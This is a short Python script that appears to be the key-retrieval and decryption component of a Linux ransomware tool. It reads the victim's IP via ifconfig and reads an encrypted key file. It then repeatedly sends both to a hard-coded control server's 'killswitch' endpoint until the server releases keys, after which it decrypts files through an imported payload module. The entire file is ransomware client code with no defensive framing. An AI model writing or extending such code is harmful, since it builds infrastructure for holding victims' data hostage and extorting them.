import requests,time
import os,platform,subprocess,re
import linux_decrypting_payload as linux

cmd = 'ifconfig'
cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
temp =  re.findall('inet \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}',cmd.stdout.read().decode())
temp = temp[0].split(" ")
temp = temp[1].rstrip()
ip = temp
while(True):
    try:
        cipher_text = open('res/key.txt.y4h','rb').read()
        cipher = cipher_text.decode()
        del cipher_text
        res = requests.get('http://172.16.0.6:5000/killswitch/'+ip+'/'+cipher)
        res = res.json()
    except:
        time.sleep(5)
        continue
    if(res['status'] == 'Fuck off'):
        time.sleep(5)
        continue
    else:
        open('res/key.txt','w').write(res['keys'])
        os.remove('res/key.txt.y4h')
        linux.decrypt_lin()
        break
